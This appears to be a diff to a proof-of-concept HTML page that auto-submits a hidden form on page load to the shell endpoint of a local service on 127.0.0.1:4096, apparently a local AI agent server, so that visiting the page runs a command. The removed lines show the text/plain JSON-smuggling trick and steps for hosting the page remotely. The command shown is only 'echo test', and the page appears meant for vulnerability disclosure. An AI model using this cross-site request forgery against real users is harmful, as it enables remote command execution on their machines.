@@ -4,16 +4,12 @@
   <title>poc</title>
 </head>
 <body>
-  <form id="poc" action="http://127.0.0.1:4096/session/ses_452f7fa4fffeWL8743c9GsaMrk/shell" method="POST" enctype="text/plain">
-    <input type="hidden" name='{"agent":"test","command":"echo test","ignore":"' value='"}'>
+  <form id="poc" action="http://127.0.0.1:4096/session/ses_452f7fa4fffeWL8743c9GsaMrk/shell" method="POST">
+    <input type="hidden" name="agent" value="test">
+    <input type="hidden" name="command" value="echo test">
   </form>
 
   <script>
-    // steps:
-    // 1. upload the file to the internet
-    // 2. start the service
-    // 3. access the HTML PoC (either locally or remotely)
-    
     // Auto-submit on page load
     window.onload = function() {
       document.getElementById('poc').submit();
